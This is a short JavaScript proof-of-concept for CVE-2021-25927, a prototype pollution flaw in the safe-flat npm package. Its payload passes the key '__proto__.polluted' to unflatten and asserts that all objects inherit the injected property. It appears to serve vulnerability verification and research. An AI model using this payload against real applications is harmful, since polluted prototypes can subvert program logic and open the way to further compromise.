//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25927
var safeFlat = require("safe-flat");
const assert = require('assert');

console.log("Before : " + {}.polluted);
safeFlat.unflatten({"__proto__.polluted": "yes"}, '.');//payload

console.log("After : " + {}.polluted);
assert({}.polluted === "yes");
console.log("Payload succeeded");
